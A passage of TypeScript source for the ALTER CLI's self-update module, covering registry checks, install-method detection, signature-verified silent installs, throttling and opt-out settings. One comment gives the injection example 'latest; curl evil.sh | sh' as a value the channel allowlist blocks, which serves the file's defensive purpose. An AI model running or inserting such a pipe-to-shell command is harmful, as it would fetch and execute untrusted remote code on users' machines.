/**
 * self-update - bounded auto-update for the ALTER CLI.
 *
 * Install-once-never-think-about-it: the CLI handles its own update on
 * invocation.
 *
 * Channel isolation (CRITICAL INVARIANT):
 *   `latest` is the public dist-tag. `fetchLatestForChannel(channel)` reads
 *   `dist-tags[channel]` exclusively. The public build resolves only
 *   `latest`.
 *
 *   Channel resolution priority: `ALTER_CLI_CHANNEL` env > config file at
 *   `${XDG_CONFIG_HOME}/alter/channel.json` > default `latest`. Everyone
 *   gets `@latest` by default.
 *
 * Eligibility (auto-install fires when ANY is true):
 *   - `ALTER_CLI_AUTO_UPDATE=1` (explicit opt-in)
 *   - default: every install is eligible (reason: `public-channel`)
 *
 * Kill switch: `ALTER_CLI_AUTO_UPDATE=0` skips entirely (and still skips the
 * notice - operators who set this want zero network chatter).
 *
 * Install-method gate: only fires when the CLI was installed via npm. brew/AUR/
 * manual installs get a notice-only path so the auto-update doesn't tread on the
 * package manager's prefix, and a SOURCE checkout is never updated over at all.
 * Distro-package paths are deliberately deferred to the package manager.
 *
 * The gate reads the CLI's OWN resolved entrypoint, never `process.execPath`.
 * execPath is the node interpreter: on a distro Node package it is
 * `/usr/bin/node` under an npm prefix of `/usr`, so testing IT against the prefix
 * returned true for every Linux user however they installed the CLI, and the
 * updater would npm-install over the top of a package-managed install. It only
 * failed loudly rather than doing so because /usr/lib/node_modules is root-owned.
 *
 * Throttle: at most one network check per hour, persisted at
 * `~/.cache/alter/self-update-check.json`. Prevents re-execing `alter` from
 * hammering npm on every shell invocation.
 *
 * Failure model: every step is best-effort. Network failure, registry
 * rate-limit, missing prefix permissions - all swallow into a one-line
 * stderr notice and let the original command run with the current version.
 */

import { spawn, spawnSync } from "child_process";
import {
  accessSync,
  constants as fsConstants,
  existsSync,
  mkdirSync,
  readFileSync,
  realpathSync,
  writeFileSync,
} from "fs";
import { dirname, join as pathJoin, resolve as pathResolve } from "path";
import * as os from "os";
import { fileURLToPath } from "url";
import * as readline from "readline";

import {
  channelToInstallMethod,
  detectInstallChannel,
} from "./install-channel.js";
import { verifyRelease, type VerifyVerdict } from "./verify-release.js";

// ---------------------------------------------------------------------------
// Constants - centralised so tests can swap them.
// ---------------------------------------------------------------------------

export const PUBLIC_CHANNEL = "latest";

/**
 * Allowlist for valid channel values. Any channel resolved outside this set
 * is rejected before being used in an npm specifier.
 *
 * The public build resolves only `latest`.
 */
export const ALLOWED_CHANNELS: ReadonlySet<string> = new Set([
  PUBLIC_CHANNEL,
]);

const NPM_PACKAGE = "@truealter/cli";
const NPM_REGISTRY_URL = `https://registry.npmjs.org/${NPM_PACKAGE}`;

const DEFAULT_THROTTLE_MS = 60 * 60 * 1000; // 1 hour
const NETWORK_TIMEOUT_MS = 4000;

// ---------------------------------------------------------------------------
// Types - every dependency is injectable so tests don't touch the network or
// the user's npm prefix.
// ---------------------------------------------------------------------------

export interface SelfUpdateDeps {
  /** Process env, defaults to `process.env`. */
  env?: NodeJS.ProcessEnv;
  /** Home dir, defaults to `os.homedir()`. */
  homedir?: () => string;
  /**
   * The NODE INTERPRETER path; defaults to `process.execPath`.
   *
   * Note this is the interpreter, NOT the CLI. It cannot answer "how was alter
   * installed" and must never be used to; see `entryPath`.
   */
  execPath?: string;
  /**
   * The CLI's own entrypoint with symlinks resolved; defaults to a realpath of
   * `process.argv[1]`. This is the path that actually says where the CLI lives,
   * and therefore the one the install-method probes read.
   */
  entryPath?: string;
  /**
   * Can this user write to the npm global prefix? Injectable so the check never
   * reads the real filesystem out from under a caller that supplied its own
   * `getNpmPrefix`. Defaults to a real writability probe of `<prefix>/lib/node_modules`.
   */
  isWritable?: (prefix: string) => boolean;
  /** `npm config get prefix` result, defaults to spawning npm. */
  getNpmPrefix?: () => string | null;
  /** Fetch impl, defaults to global `fetch`. */
  fetchImpl?: typeof fetch;
  /** Run a command (e.g. `npm install -g`). Returns 0 on success. */
  /**
   * Runs the INSTALLER (`npm install -g`). Its stdout is inherited so the user
   * watches npm work, which is why it cannot report stdout back as a string.
   * Never hand this to a probe that needs to READ output; see `probeCommand`.
   */
  runCommand?: (cmd: string, args: string[]) => { code: number; stderr: string };
  /**
   * Runs a read-only PROBE (`pacman -Qi`, `npm config get prefix`) and CAPTURES
   * its output. Distinct from `runCommand` because the two want opposite things
   * from stdout: the installer streams it, a probe reads it.
   */
  probeCommand?: (
    cmd: string,
    args: string[],
  ) => { code: number; stdout: string; stderr: string };
  /**
   * Host platform; defaults to `process.platform`. Forwarded to the channel
   * probes because several gate on it (the AUR probe only runs on linux), so a
   * fixture that cannot state its OS can only ever describe the machine it
   * happens to run on.
   */
  platform?: NodeJS.Platform;
  /** Read a file as utf8 or return null on miss. */
  readFile?: (path: string) => string | null;
  /** Write a file (creates parents). */
  writeFile?: (path: string, contents: string) => void;
  /** Stderr writer. */
  stderr?: (line: string) => void;
  /** Now-clock, in ms. */
  now?: () => number;
  /**
   * Spawn a detached worker that performs a verified self-update in the
   * background (default: re-invokes this CLI as `__bg-update`). Injectable so
   * tests can record the call without spawning a real process.
   */
  spawnBackgroundUpdate?: (version: string) => void;
  /**
   * Verify that a target version is an authentically ALTER-CI-signed release
   * before a SILENT install. Defaults to the real sigstore-keyless verifier
   * (`verifyRelease`). Returns a three-way verdict; only "verified" permits a
   * silent install, "rejected" blocks it outright, "unavailable" falls back to
   * the interactive prompt.
   */
  verifyReleaseImpl?: (version: string) => Promise<VerifyVerdict>;
}

export interface UpdateCheckResult {
  current: string;
  latest: string | null;
  channel: string;
  eligible: boolean;
  reason: string;
  /** `source` = a dev checkout, which never self-updates. */
  installMethod: "npm" | "external" | "source" | "unknown";
  shouldUpdate: boolean;
}

interface ThrottleState {
  last_check_ms: number;
  last_seen_latest: string | null;
  channel: string;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Decide whether an update should be installed and return the reasoning. Pure
 * function modulo the dependencies - every IO path is injectable.
 */
export async function checkForUpdate(opts: {
  currentVersion: string;
  deps?: SelfUpdateDeps;
}): Promise<UpdateCheckResult> {
  const deps = withDefaults(opts.deps);
  const env = deps.env;
  const handle = readSessionHandle(deps);
  const channel = resolveChannel(deps);
  const installMethod = detectInstallMethod(deps);

  const eligibility = evaluateEligibility({ env, handle, channel, installMethod });
  if (!eligibility.eligible) {
    return {
      current: opts.currentVersion,
      latest: null,
      channel,
      eligible: false,
      reason: eligibility.reason,
      installMethod,
      shouldUpdate: false,
    };
  }

  const latest = await fetchLatestForChannel(channel, deps);
  if (latest === null) {
    return {
      current: opts.currentVersion,
      latest: null,
      channel,
      eligible: true,
      reason: "registry-unreachable",
      installMethod,
      shouldUpdate: false,
    };
  }

  const shouldUpdate = compareSemver(latest, opts.currentVersion) > 0;
  return {
    current: opts.currentVersion,
    latest,
    channel,
    eligible: true,
    reason: shouldUpdate ? "newer-available" : "already-current",
    installMethod,
    shouldUpdate,
  };
}

/**
 * Run `npm install -g <pkg>@<channel>`. Returns true on success. Caller is
 * responsible for re-execing the new binary; this function does not
 * self-replace.
 */
export function performUpdate(opts: {
  channel: string;
  /**
   * Exact verified version to pin to (from a "verified" verdict). When set,
   * the install targets this exact version rather than the moving channel
   * dist-tag - closing the verify→install TOCTOU where a dist-tag flip after
   * verification could swap in different bytes. npm independently verifies the
   * pinned version's tarball against the registry's published integrity.
   */
  version?: string;
  /**
   * npm SRI (sha512) of the verified tarball. Asserted on the install as a
   * belt-and-suspenders check against a tampered registry serving different
   * bytes for the pinned version. Best-effort: ignored by npm if unsupported.
   */
  integrity?: string;
  deps?: SelfUpdateDeps;
}): { ok: boolean; stderr: string } {
  const deps = withDefaults(opts.deps);
  const target = opts.version
    ? `${NPM_PACKAGE}@${opts.version}`
    : `${NPM_PACKAGE}@${opts.channel}`;
  const args = ["install", "-g", target];
  if (opts.integrity) args.push(`--integrity=${opts.integrity}`);
  const result = deps.runCommand("npm", args);
  return { ok: result.code === 0, stderr: result.stderr };
}

/**
 * High-level entry point. Wired into `main()` from `src/index.ts`.
 *
 * Behaviour:
 *   - Honours throttle file unless `force: true`.
 *   - When `mode === "sync"`: prompts the user inline. Used for `alter login`
 *     and `alter wire`, where running on a stale CLI causes user-visible
 *     breakage.
 *   - When `mode === "async"`: prints a one-line notice to stderr but does
 *     not block the command. Used for everything else.
 */
export async function maybeAutoUpdate(opts: {
  currentVersion: string;
  command: string | undefined;
  mode: "sync" | "async" | "background";
  deps?: SelfUpdateDeps;
  force?: boolean;
}): Promise<{ updated: boolean; result: UpdateCheckResult | null }> {
  const deps = withDefaults(opts.deps);
  const env = deps.env;

  if (env.ALTER_CLI_AUTO_UPDATE === "0") {
    return { updated: false, result: null };
  }

  // Opt-out: `alter update auto off` persists a config flag that disables the
  // check entirely. The env kill switch above takes precedence.
  if (readAutoUpdateConfig(deps) === "off") {
    return { updated: false, result: null };
  }

  if (!opts.force && isThrottled(opts.currentVersion, deps)) {
    return { updated: false, result: null };
  }

  let result: UpdateCheckResult;
  try {
    result = await checkForUpdate({
      currentVersion: opts.currentVersion,
      deps,
    });
  } catch {
    // Defensive: any unexpected throw must NOT block the user's command.
    return { updated: false, result: null };
  }

  writeThrottleState(result, deps);

  // A source build never self-updates, and it never nags either: its version is
  // whatever the working tree last built, which may legitimately be AHEAD of
  // what is published, so comparing it against npm and crying "newer available"
  // would be noise. Say the true thing only when the update was asked for
  // explicitly (`alter update`), and name the remedy that actually applies.
  if (result.installMethod === "source") {
    if (opts.force) {
      const root = resolveSourceRoot(deps);
      deps.stderr(
        `alter: this is a local build${root ? ` from ${root}` : ""}, not an installed release, so it does not self-update.`,
      );
      deps.stderr(
        `alter: update it by rebuilding the checkout${root ? ` (git pull && npm run build in ${root})` : ""}.`,
      );
    }
    return { updated: false, result };
  }

  if (!result.shouldUpdate) {
    return { updated: false, result };
  }

  if (result.installMethod !== "npm") {
    deps.stderr(
      `alter: newer version available (${result.latest}) - upgrade with your package manager (current install is not npm-managed).`,
    );
    return { updated: false, result };
  }

  // An npm update that cannot possibly land should say so rather than dying on
  // a raw EACCES from a child process. A root-owned global prefix (`/usr` on
  // most distro Node packages) is the common case, and telling the user to
  // sudo-install over a system directory is worse advice than telling them the
  // truth.
  const prefixWarning = describeUnwritablePrefix(deps);
  if (prefixWarning) {
    deps.stderr(`alter: newer version available (${result.latest}), ${prefixWarning}`);
    return { updated: false, result };
  }

  if (opts.mode === "async") {
    // Background-silent: hand the verified install to a detached worker so
    // the current command is never blocked or interrupted.
    // The upgrade lands on the next launch, with no notice and no `alter
    // update` to type. The worker re-runs this check in "background" mode,
    // which installs only a signature-verified release and otherwise no-ops:
    // we never silently install unverified bytes.
    deps.spawnBackgroundUpdate(result.latest!);
    return { updated: false, result };
  }

  // Sync mode: verify-before-exec. If the target release is cryptographically
  // verified as an ALTER-CI-signed artefact (sigstore-keyless, against the
  // releases.truealter.com trust anchor), install SILENTLY - "install once,
  // never think about it". The interactive prompt is retained ONLY as the
  // fallback for when verification cannot be completed.
  let verdict: VerifyVerdict;
  try {
    verdict = await deps.verifyReleaseImpl(result.latest!);
  } catch {
    // Defensive: a throw in the verifier must NEVER silent-install. Degrade to
    // the interactive prompt.
    verdict = { status: "unavailable", reason: "verifier threw" };
  }

  // A "rejected" verdict is a real cryptographic / integrity failure. Never
  // install, and never prompt - letting a user click through a signature
  // rejection is the exact silent-RCE path this guards against.
  if (verdict.status === "rejected") {
    deps.stderr(
      `alter: update to ${result.latest} FAILED signature verification (${verdict.reason}); not installing. Staying on ${result.current}.`,
    );
    return { updated: false, result };
  }

  // Verified: silent install, no prompt. Pin to exactly the version we
  // verified + assert its npm integrity so the bytes installed are the bytes
  // verified - no dist-tag-flip / registry-swap window between verify and
  // `npm install`. FAIL-CLOSED: a verified verdict that somehow carries no
  // npm_integrity (it always should for the npm-tarball platform) is NOT
  // silent-installed; it falls through to the unavailable handling below
  // rather than installing without an integrity pin.
  if (verdict.status === "verified" && verdict.npmIntegrity) {
    return finishInstall(result, deps, {
      version: verdict.version,
      integrity: verdict.npmIntegrity,
    });
  }

  // "unavailable": verification could not be completed (trust anchor not yet
  // populated, network timeout, packaging gap).
  //
  // Background mode cannot prompt and must never install unverified bytes, so
  // it no-ops here and lets the next launch re-check. Waiting until a release
  // can be verified is the only safe zero-interaction behaviour.
  if (opts.mode === "background") {
    deps.stderr(
      `alter: update to ${result.latest} could not be signature-verified; skipping silent install (will retry next launch).`,
    );
    return { updated: false, result };
  }

  // Sync mode falls back to the interactive prompt before any install, no
  // worse than the prior behaviour.
  const confirmed = await promptInstall({
    current: result.current,
    latest: result.latest!,
    channel: result.channel,
    deps,
  });
  if (!confirmed) {
    deps.stderr(
      `alter: skipping update to ${result.latest}. Re-run to be prompted again, or set ALTER_CLI_AUTO_UPDATE=0 to suppress.`,
    );
    return { updated: false, result };
  }

  return finishInstall(result, deps);
}

/**
 * Run the npm install and emit the success/failure notice. Shared by the
 * verified-silent path and the prompt-confirmed path.
 */
function finishInstall(
  result: UpdateCheckResult,
  deps: Required<SelfUpdateDeps>,
  verified?: { version: string; integrity: string },
): { updated: boolean; result: UpdateCheckResult } {
  // When the verdict was "verified", pin to that exact version + integrity.
  // On the "unavailable" + user-confirmed path there is no verified version,
  // so fall back to the channel dist-tag (unchanged behaviour).
  const update = performUpdate({
    channel: result.channel,
    version: verified?.version,
    integrity: verified?.integrity,
    deps,
  });
  if (!update.ok) {
    deps.stderr(
      `alter: update failed (${update.stderr.trim() || "unknown error"}); continuing on ${result.current}.`,
    );
    return { updated: false, result };
  }
  deps.stderr(
    `alter: upgraded to ${result.latest}. Re-run your command to use the new version.`,
  );
  return { updated: true, result };
}

// ---------------------------------------------------------------------------
// Helpers (also exported for direct testing)
// ---------------------------------------------------------------------------

/**
 * Prompt the user to confirm a public-channel update before installing.
 *
 * Public-channel sync-mode installs were previously silent. A compromised
 * npm package or poisoned channel.json → silent RCE with no interaction.
 * Prompting breaks the zero-interaction requirement.
 *
 * The `deps` parameter carries an injectable stderr for testability; the
 * stdin read is always process.stdin (non-injectable) because tests should
 * not exercise the blocking readline path.
 */
async function promptInstall(opts: {
  current: string;
  latest: string;
  channel: string;
  deps: Required<SelfUpdateDeps>;
}): Promise<boolean> {
  // TTY guard: if stdin is not interactive (CI, piped), default-deny the
  // install so automated pipelines don't hang waiting for a prompt.
  if (!process.stdin.isTTY) {
    opts.deps.stderr(
      `alter: update available (${opts.current} → ${opts.latest}) but stdin is not a TTY; skipping. Run \`alter update\` to install manually.`,
    );
    return false;
  }
  opts.deps.stderr(
    `alter: version ${opts.latest} is available (you have ${opts.current}).`,
  );
  return new Promise<boolean>((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stderr,
    });
    rl.question(
      `Install now? [y/N] `,
      (answer: string) => {
        rl.close();
        resolve(answer.trim().toLowerCase() === "y");
      },
    );
  });
}

export function evaluateEligibility(opts: {
  env: NodeJS.ProcessEnv;
  handle: string | null;
  /** The RELEASE channel (stable / next), NOT the install channel. */
  channel: string;
  /** How the CLI got here. `source` means a dev checkout. */
  installMethod?: "npm" | "external" | "source" | "unknown";
}): { eligible: boolean; reason: string } {
  // A SOURCE install is running from the CLI's own checkout and is NEVER
  // self-updated. Checked BEFORE the env opt-in, because the opt-in must not be
  // able to talk the updater into it either.
  //
  // Self-update means `npm install -g @truealter/cli`. Against a source
  // checkout that is not an update, it is a REPLACEMENT: it fetches the PUBLIC
  // release and installs it over a local build that may be ahead of, behind, or
  // simply different from what is on npm, including surfaces that are not part
  // of the public build by construction. The principal's build and the public
  // release are separate
  // classes; neither may overwrite the other.
  //
  // Note this keys on the INSTALL METHOD, not `channel`. `channel` here is the
  // RELEASE channel (stable / next) and never carries an install identity.
  if (opts.installMethod === "source") {
    return { eligible: false, reason: "source-build-never-self-updates" };
  }
  if (opts.env.ALTER_CLI_AUTO_UPDATE === "1") {
    return { eligible: true, reason: "env-opt-in" };
  }
  // Channel isolation is enforced by fetchLatestForChannel(). All public
  // users are eligible.
  return { eligible: true, reason: "public-channel" };
}

export function compareSemver(a: string, b: string): number {
  const [aMajor, aMinor, aPatch, aPre] = parseSemver(a);
  const [bMajor, bMinor, bPatch, bPre] = parseSemver(b);
  if (aMajor !== bMajor) return aMajor - bMajor;
  if (aMinor !== bMinor) return aMinor - bMinor;
  if (aPatch !== bPatch) return aPatch - bPatch;
  // A version with a pre-release tag is LOWER than the same version without.
  if (aPre && !bPre) return -1;
  if (!aPre && bPre) return 1;
  if (aPre && bPre) return aPre.localeCompare(bPre);
  return 0;
}

function parseSemver(v: string): [number, number, number, string | null] {
  const match = /^(\d+)\.(\d+)\.(\d+)(?:-([0-9A-Za-z.-]+))?/.exec(v);
  if (!match) return [0, 0, 0, null];
  return [
    Number(match[1]),
    Number(match[2]),
    Number(match[3]),
    match[4] ?? null,
  ];
}

export function resolveChannel(deps: Required<SelfUpdateDeps>): string {
  const fromEnv = (deps.env.ALTER_CLI_CHANNEL ?? "").trim();
  if (fromEnv) {
    // Reject any channel value not on the allowlist so an attacker-written
    // env var or channel.json can't inject an arbitrary npm specifier
    // (e.g. "latest; curl evil.sh | sh", a git URL, a file: path).
    if (ALLOWED_CHANNELS.has(fromEnv)) return fromEnv;
    deps.stderr(
      `alter: ALTER_CLI_CHANNEL="${fromEnv}" is not a recognised channel (allowed: ${[...ALLOWED_CHANNELS].join(", ")}); falling back to ${PUBLIC_CHANNEL}.`,
    );
  }
  const channelFile = pathResolve(
    deps.env.XDG_CONFIG_HOME ?? pathResolve(deps.homedir(), ".config"),
    "alter",
    "channel.json",
  );
  const raw = deps.readFile(channelFile);
  if (raw) {
    try {
      const parsed = JSON.parse(raw) as { channel?: unknown };
      const fromFile =
        typeof parsed.channel === "string" ? parsed.channel.trim() : "";
      if (fromFile) {
        if (ALLOWED_CHANNELS.has(fromFile)) return fromFile;
        // Silently ignore unrecognised values from channel.json rather than
        // propagating them into an npm specifier.
        deps.stderr(
          `alter: channel.json channel="${fromFile}" is not a recognised channel; using ${PUBLIC_CHANNEL}.`,
        );
      }
    } catch {
      // Fall through.
    }
  }
  return PUBLIC_CHANNEL;
}

export function readSessionHandle(deps: Required<SelfUpdateDeps>): string | null {
  const sessionFile = pathResolve(
    deps.env.XDG_CONFIG_HOME ?? pathResolve(deps.homedir(), ".config"),
    "alter",
    "session.json",
  );
  const raw = deps.readFile(sessionFile);
  if (!raw) return null;
  try {
    const parsed = JSON.parse(raw) as { handle?: unknown };
    if (typeof parsed.handle === "string" && parsed.handle.trim()) {
      return parsed.handle.trim();
    }
  } catch {
    // Fall through.
  }
  return null;
}

export function detectInstallMethod(
  deps: Required<SelfUpdateDeps>,
): "npm" | "external" | "source" | "unknown" {
  // Channel detection lives in `install-channel.ts` (10-value enum). Map down
  // to the small enum the auto-update gate consumes: `npm install -g` is
  // permitted ONLY on `"npm"`.
  //
  // The mapping is intentional: brew/aur/scoop/winget/nix/pipx/binary all
  // become `"external"` because auto-update MUST NOT npm-install over the top
  // of a package-manager install, and `dev` becomes `"source"` because it must
  // not be installed over either.
  //
  // The 9-value detector runs FIRST. It used to be pre-empted by the npm-prefix
  // shortcut below, which was a bug with a wide blast radius:
  //
  //   the shortcut asked "does the NODE INTERPRETER live under the npm prefix?"
  //   when it meant "does the ALTER ENTRYPOINT live under the npm prefix?"
  //
  // On a stock Linux box with the distro's Node, `process.execPath` is
  // `/usr/bin/node` and `npm config get prefix` is `/usr`, so the test was true
  // for EVERY user regardless of how they actually installed the CLI. An AUR,
  // brew, curl-binary or source install all classified as `npm`, and the
  // updater would `npm install -g` straight over the top of them, which is
  // exactly what the comment above says must never happen. It only ever failed
  // loudly instead of doing so because the global prefix (`/usr/lib/node_modules`)
  // is root-owned, so the install died on EACCES. That was luck, not a guard.
  //
  // So: classify from the real channel first, and only consult the prefix as a
  // fallback, comparing it against the CLI's own resolved entrypoint rather
  // than the interpreter that happens to be running it.
  // Forward `probeCommand` too. Several probes shell out (`pacman -Qi` for AUR,
  // `npm config get prefix` for the npm family), and dropping the injected
  // runner meant they silently reached the REAL host: an AUR fixture ran the
  // real `pacman`, found none on a non-Arch machine, and fell through to the
  // npm-prefix test, where `/usr/bin/alter` does sit under `/usr` and so
  // classified as npm. It reproduced only OFF Arch, which is exactly the class
  // of thing a one-OS "it passes locally" claim misses.
  const channel = detectInstallChannel({
    env: deps.env,
    execPath: deps.execPath,
    scriptPath: deps.entryPath,
    runCommand: deps.probeCommand,
    platform: deps.platform,
  });
  const method = channelToInstallMethod(channel);
  if (method !== "unknown") return method;

  // Unclassified: fall back to the prefix test, now asking the right question.
  const prefix = deps.getNpmPrefix();
  if (prefix && deps.entryPath && deps.entryPath.startsWith(prefix)) {
    return "npm";
  }
  return "unknown";
}

async function fetchLatestForChannel(
  channel: string,
  deps: Required<SelfUpdateDeps>,
): Promise<string | null> {
  let response: Response;
  try {
    response = await deps.fetchImpl(NPM_REGISTRY_URL, {
      headers: { accept: "application/vnd.npm.install-v1+json" },
      signal: AbortSignal.timeout(NETWORK_TIMEOUT_MS),
    });
  } catch {
    return null;
  }
  if (!response.ok) return null;
  let body: unknown;
  try {
    body = await response.json();
  } catch {
    return null;
  }
  if (!body || typeof body !== "object") return null;
  const distTags = (body as { "dist-tags"?: Record<string, string> })[
    "dist-tags"
  ];
  if (!distTags || typeof distTags !== "object") return null;
  const tag = distTags[channel];
  if (typeof tag !== "string") return null;
  return tag;
}

// ---------------------------------------------------------------------------
// Auto-update opt-out config (`alter update auto off|on|status`)
// ---------------------------------------------------------------------------

function autoUpdateConfigPath(deps: Required<SelfUpdateDeps>): string {
  return pathResolve(
    deps.env.XDG_CONFIG_HOME ?? pathResolve(deps.homedir(), ".config"),
    "alter",
    "self-update.json",
  );
}

/**
 * Read the persisted auto-update preference. Returns "off" only when the user
 * has explicitly opted out; "on" when explicitly opted in; null when unset
 * (treated as on by default).
 */
export function readAutoUpdateConfig(
  deps: Required<SelfUpdateDeps>,
): "on" | "off" | null {
  const raw = deps.readFile(autoUpdateConfigPath(deps));
  if (!raw) return null;
  try {
    const parsed = JSON.parse(raw) as { auto_update?: unknown };
    if (parsed.auto_update === "off") return "off";
    if (parsed.auto_update === "on") return "on";
  } catch {
    // Fall through - a corrupt config defaults to on.
  }
  return null;
}

function writeAutoUpdateConfig(
  deps: Required<SelfUpdateDeps>,
  value: "on" | "off",
): void {
  try {
    deps.writeFile(
      autoUpdateConfigPath(deps),
      JSON.stringify({ auto_update: value }),
    );
  } catch {
    // Best-effort.
  }
}

/** Persist the auto-update preference (`alter update auto on|off`). */
export function setAutoUpdate(enabled: boolean, deps?: SelfUpdateDeps): void {
  writeAutoUpdateConfig(withDefaults(deps), enabled ? "on" : "off");
}

/**
 * Effective auto-update state for `alter update auto status`. The env kill
 * switch (`ALTER_CLI_AUTO_UPDATE=0`) forces "off" regardless of the persisted
 * preference.
 */
export function getAutoUpdateStatus(deps?: SelfUpdateDeps): "on" | "off" {
  const d = withDefaults(deps);
  if (d.env.ALTER_CLI_AUTO_UPDATE === "0") return "off";
  return readAutoUpdateConfig(d) === "off" ? "off" : "on";
}

function throttleStatePath(deps: Required<SelfUpdateDeps>): string {
  const cacheRoot =
    deps.env.XDG_CACHE_HOME ?? pathResolve(deps.homedir(), ".cache");
  return pathResolve(cacheRoot, "alter", "self-update-check.json");
}

function isThrottled(
  currentVersion: string,
  deps: Required<SelfUpdateDeps>,
): boolean {
  const path = throttleStatePath(deps);
  const raw = deps.readFile(path);
  if (!raw) return false;
  let parsed: ThrottleState;
  try {
    parsed = JSON.parse(raw) as ThrottleState;
  } catch {
    return false;
  }
  if (typeof parsed.last_check_ms !== "number") return false;
  // If the user has just upgraded (current > last_seen_latest), bypass the
  // throttle so the post-install check rewrites state and avoids stale
  // "newer available" notices.
  if (
    parsed.last_seen_latest &&
    compareSemver(currentVersion, parsed.last_seen_latest) >= 0
  ) {
    // Post-install path - clear the throttle.
    return false;
  }
  return deps.now() - parsed.last_check_ms < DEFAULT_THROTTLE_MS;
}

function writeThrottleState(
  result: UpdateCheckResult,
  deps: Required<SelfUpdateDeps>,
): void {
  const path = throttleStatePath(deps);
  const state: ThrottleState = {
    last_check_ms: deps.now(),
    last_seen_latest: result.latest,
    channel: result.channel,
  };
  try {
    deps.writeFile(path, JSON.stringify(state));
  } catch {
    // Throttle is best-effort.
  }
}

/**
 * The CLI's own entrypoint, symlinks resolved.
 *
 * `process.execPath` is the NODE INTERPRETER and says nothing about where the
 * CLI came from. `process.argv[1]` is the script, and a dev install is reached
 * THROUGH a symlink (`~/.local/bin/alter` -> `<repo>/dist/index.js`), so the
 * raw value lies about its home and must be resolved.
 */
function defaultEntryPath(): string {
  const script = process.argv[1];
  if (!script) return "";
  try {
    return realpathSync(script);
  } catch {
    return script;
  }
}

/** Read-only probe runner: CAPTURES stdout, unlike the installer runner. */
function defaultProbeCommand(
  cmd: string,
  args: string[],
): { code: number; stdout: string; stderr: string } {
  try {
    const result = spawnSync(cmd, args, {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      timeout: 10_000,
    });
    return {
      code: result.status ?? 1,
      stdout: result.stdout ?? "",
      stderr: result.stderr ?? "",
    };
  } catch {
    return { code: 1, stdout: "", stderr: "" };
  }
}

/** Real writability probe of the npm global install target. */
function defaultIsWritable(prefix: string): boolean {
  const target = pathJoin(prefix, "lib", "node_modules");
  try {
    accessSync(existsSync(target) ? target : prefix, fsConstants.W_OK);
    return true;
  } catch {
    return false;
  }
}

/**
 * The root of the source checkout we are running from, for the "rebuild it"
 * message. Null when this is not a source build.
 */
function resolveSourceRoot(deps: Required<SelfUpdateDeps>): string | null {
  let dir = deps.entryPath ? dirname(deps.entryPath) : "";
  for (let i = 0; i < 6 && dir; i++) {
    if (existsSync(pathJoin(dir, ".git"))) return dir;
    const parent = dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return null;
}

/**
 * Describe why an `npm install -g` cannot land, or null when it can.
 *
 * The global prefix on a distro Node package is typically `/usr`, whose
 * `lib/node_modules` is root-owned, so the install dies on EACCES. We do NOT
 * tell the user to re-run under sudo: installing a user-facing CLI into a
 * system-owned directory is bad advice, and token/credential provisioning aside,
 * the correct remedy is a user-writable prefix or the platform package.
 */
function describeUnwritablePrefix(
  deps: Required<SelfUpdateDeps>,
): string | null {
  const prefix = deps.getNpmPrefix();
  if (!prefix) return null;
  // Through the injected seam, never the real filesystem: this must not read
  // the host it happens to be running on when a caller has supplied its own
  // view of the world.
  if (deps.isWritable(prefix)) return null;
  return (
    `but the global npm prefix (${prefix}) is not writable by this user, so the update cannot install. ` +
    `Point npm at a user-writable prefix (npm config set prefix ~/.local), or install alter through your platform's package.`
  );
}

// ---------------------------------------------------------------------------
// Default IO impls
// ---------------------------------------------------------------------------

function withDefaults(deps?: SelfUpdateDeps): Required<SelfUpdateDeps> {
  return {
    env: deps?.env ?? process.env,
    homedir: deps?.homedir ?? (() => os.homedir()),
    execPath: deps?.execPath ?? process.execPath,
    entryPath: deps?.entryPath ?? defaultEntryPath(),
    isWritable: deps?.isWritable ?? defaultIsWritable,
    probeCommand: deps?.probeCommand ?? defaultProbeCommand,
    platform: deps?.platform ?? process.platform,
    getNpmPrefix: deps?.getNpmPrefix ?? defaultGetNpmPrefix,
    fetchImpl: deps?.fetchImpl ?? fetch,
    runCommand: deps?.runCommand ?? defaultRunCommand,
    readFile: deps?.readFile ?? defaultReadFile,
    writeFile: deps?.writeFile ?? defaultWriteFile,
    stderr: deps?.stderr ?? ((line: string) => process.stderr.write(line + "\n")),
    now: deps?.now ?? (() => Date.now()),
    spawnBackgroundUpdate:
      deps?.spawnBackgroundUpdate ?? defaultSpawnBackgroundUpdate,
    verifyReleaseImpl:
      deps?.verifyReleaseImpl ??
      ((version: string) => verifyRelease({ version })),
  };
}

// Memoised across the process: `npm config get prefix` spawns a subprocess
// (~hundreds of ms on Windows where npm is a .cmd shim), and detectInstallMethod
// can probe it more than once per invocation. The prefix is stable for the
// life of a process, so one spawn suffices.
// `undefined` = not yet probed; `null` = probed-and-unavailable.
let _npmPrefixMemo: string | null | undefined;

function defaultGetNpmPrefix(): string | null {
  if (_npmPrefixMemo !== undefined) return _npmPrefixMemo;
  _npmPrefixMemo = null;
  try {
    const result = spawnSync("npm", ["config", "get", "prefix"], {
      encoding: "utf8",
      timeout: 2000,
    });
    if (result.status === 0 && result.stdout) {
      _npmPrefixMemo = result.stdout.trim();
    }
  } catch {
    // Fall through - memo stays null.
  }
  return _npmPrefixMemo;
}

function defaultRunCommand(
  cmd: string,
  args: string[],
): { code: number; stderr: string } {
  const result = spawnSync(cmd, args, {
    encoding: "utf8",
    stdio: ["ignore", "inherit", "pipe"],
    timeout: 60_000,
  });
  return {
    code: typeof result.status === "number" ? result.status : 1,
    stderr: result.stderr ?? "",
  };
}

function defaultSpawnBackgroundUpdate(version: string): void {
  // Re-invoke this same CLI as a detached `__bg-update` worker. Resolving via
  // process.execPath + argv[1] avoids depending on `alter` being on PATH. The
  // child's stdio is fully ignored and it is unref'd, so it outlives, and
  // never blocks, the foreground command.
  try {
    const entry = process.argv[1];
    if (!entry) return;
    const child = spawn(process.execPath, [entry, "__bg-update", version], {
      detached: true,
      stdio: "ignore",
    });
    child.unref();
  } catch {
    // Best-effort: a failed spawn just defers the update to the next launch.
  }
}

function defaultReadFile(path: string): string | null {
  try {
    return readFileSync(path, "utf8");
  } catch {
    return null;
  }
}

function defaultWriteFile(path: string, contents: string): void {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, contents);
}

// ---------------------------------------------------------------------------
// Convenience helper: classify the active command for the sync/async gate.
// ---------------------------------------------------------------------------

/**
 * Commands whose user-visible failure mode collapses without auto-update
